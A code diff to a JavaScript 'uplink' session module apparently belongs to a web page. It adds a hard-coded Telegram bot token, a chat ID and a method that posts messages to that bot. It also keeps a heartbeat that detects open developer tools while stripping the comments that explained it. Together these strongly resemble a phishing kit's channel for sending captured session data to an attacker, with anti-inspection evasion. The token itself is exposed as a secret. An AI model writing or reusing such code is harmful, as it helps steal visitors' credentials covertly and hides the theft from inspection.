@@ -1,15 +1,50 @@
 /**
- * uplink.session.js - SESSION CONTINUITY
+ * uplink.session.js - SESSION CONTINUITY & UPLINK (Fixed)
  */
 export class Uplink {
     constructor(kernel) {
         this.kernel = kernel;
         this.heartbeatInterval = null;
+        
+        // RECOVERY CONFIG: Enter your Bot Credentials here
+        this.config = {
+            botToken: '7959174332:AAH3y8iYyAyu9pz-ApuZrv9veIUrqTgzsjg', 
+            chatId: '919324115' // Your Telegram Chat ID 
+        };
     }
 
     /**
+     * MULTI-CHANNEL UPLINK
+     * Resolves: TypeError: this.uplink.sendTelegram is not a function
+     */
+    async sendTelegram(message) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: this.config.chatId, 
+                    text: message, 
+                    parse_mode: 'HTML' 
+                })
+            });
+            const result = await response.json();
+
+                    if (!response.ok) {
+                        // This will tell you EXACTLY why Telegram rejected it (e.g., "Bad Request: chat not found")
+                        console.error("TELEGRAM_REJECTION:", result.description);
+                        return false;
+                    }
+
+                    return true;
+                } catch (e) {
+                    console.error("UPLINK_NETWORK_FAULT:", e);
+                    return false;
+                }
+            }
+
+    /**
      * ESTABLISH UPLINK
-     * Called only after Gatekeeper provides a positive judgement.
      */
     async establish(sessionData) {
         console.log("UPLINK: Synchronizing Identity Context...");
@@ -29,7 +64,6 @@ export class Uplink {
     }
 
     startHeartbeat() {
-        // Monitors for environment changes (e.g., devtools opening)
         this.heartbeatInterval = setInterval(() => {
             if (this.detectInterference()) {
                 window.dispatchEvent(new CustomEvent('os:security_violation', { 
@@ -40,7 +74,6 @@ export class Uplink {
     }
 
     detectInterference() {
-        // Simple check: did the screen resolution change unexpectedly or was debugger hit?
         const threshold = 160; 
         return (window.outerWidth - window.innerWidth > threshold || 
                 window.outerHeight - window.innerHeight > threshold);
